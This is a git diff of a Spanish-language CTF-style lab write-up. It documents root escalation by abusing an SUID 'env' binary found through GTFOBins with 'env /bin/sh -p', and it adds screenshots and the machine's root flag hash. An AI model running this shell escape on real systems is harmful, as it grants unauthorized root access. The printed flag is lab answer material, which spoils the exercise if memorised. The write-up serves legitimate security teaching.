@@ -184,48 +184,28 @@ Durante la enumeración se identifica el siguiente binario:
 ```text
 /usr/bin/env
 ```
+<img width="1920" height="921" alt="Screenshot_2026-08-20_01_47_09" src="https://github.com/user-attachments/assets/5b5bac5b-baab-4a98-bd4e-6dad64a1e5e8" />
 
 El binario `env` posee permisos SUID, lo que permite ejecutarlo con los privilegios del propietario del archivo.
-
----
 
 # 🚀 Explotación del SUID
 
 Se consulta la documentación de **GTFOBins** para comprobar si `env` puede utilizarse para obtener una shell privilegiada.
 
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_05_46" src="https://github.com/user-attachments/assets/014451d7-6715-4c34-ad0d-077ad6892048" />
+
 La técnica permite ejecutar una shell utilizando los privilegios elevados del binario.
+
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_05_56" src="https://github.com/user-attachments/assets/a0bc7c3d-c626-44b1-9fc8-2ba4b850bcda" />
 
 Se ejecuta:
 
 ```bash
-/usr/bin/env /bin/sh
+env /bin/sh -p
 ```
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_06_29" src="https://github.com/user-attachments/assets/47e0f0af-3012-493c-a19f-c0f93bcb21f8" />
 
 Posteriormente verificamos los privilegios:
-
-```bash
-whoami
-```
-
-Resultado:
-
-```text
-root
-```
-
-También podemos comprobar:
-
-```bash
-id
-```
-
-El resultado confirma que hemos obtenido privilegios de administrador.
-
-### 📸 Privilege Escalation
-
-> Agregar aquí captura de la explotación de `env` y del resultado de `whoami`.
-
----
 
 # 👑 Root Access
 
@@ -234,27 +214,27 @@ Finalmente verificamos el acceso como root:
 ```bash
 whoami
 ```
-
 Resultado:
 
 ```text
 root
 ```
-
-También podemos comprobar el acceso al directorio `/root`:
-
-```bash
-cd /root
-ls -la
-```
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_06_42" src="https://github.com/user-attachments/assets/cdfb89e6-4da7-4458-8636-19f39de4a189" />
 
 La máquina ha sido comprometida exitosamente y se han obtenido privilegios de root.
 
-### 📸 Root
+dentro del directorio root hay un archivo llamado root.txt
 
-> Agregar aquí captura final demostrando acceso como root.
+miramos que tiene dentro con el comando less
 
----
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_07_14" src="https://github.com/user-attachments/assets/94b5067b-4eee-43a9-998d-c535f693bf49" />
+
+encontramos nuestra ultima Flag
+```text
+551df067bd06f13f1c092743493de034
+```
+<img width="1920" height="921" alt="Screenshot_2026-08-20_03_08_22" src="https://github.com/user-attachments/assets/fe8a7acb-5384-4844-903f-c04516f87a59" />
+
 
 # 🧠 Lecciones Aprendidas
 
